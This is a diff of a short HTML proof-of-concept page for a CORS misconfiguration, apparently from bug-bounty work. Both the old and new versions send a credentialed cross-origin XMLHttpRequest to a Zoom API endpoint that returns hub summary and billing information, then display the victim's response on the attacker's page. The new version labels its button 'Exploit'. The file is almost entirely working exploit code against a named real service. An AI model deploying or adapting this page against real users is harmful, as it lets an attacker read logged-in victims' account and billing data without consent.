@@ -1,24 +1,24 @@
 <html>
-<script>function loadDoc() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("putithere").innerHTML = this.responseText;
-    }
-  };
-  xhttp.open("GET", "https://on.zoom.us/api/v1/e/hub/hubs/summary?includeTotals=false&defaultOnly=false&includeBillingInfo=true", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
+<body>
+<h2>CORS PoC</h2>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+<script>
+function cors() {
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText);
+}
+};	
+ xhr.open("GET","https://on.zoom.us/api/v1/e/hub/hubs/summary?includeTotals=false&defaultOnly=false&includeBillingInfo=true", true);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.withCredentials = true;
+xhr.send();
 }
 </script>
-
-
-<body>
-
-<h1>Cors Misconfiguration POC</h1>
-
-<button type="button" onclick="loadDoc()">Request data</button>
-
-<p id="putithere"></p>
 </body>
 </html>
+
+
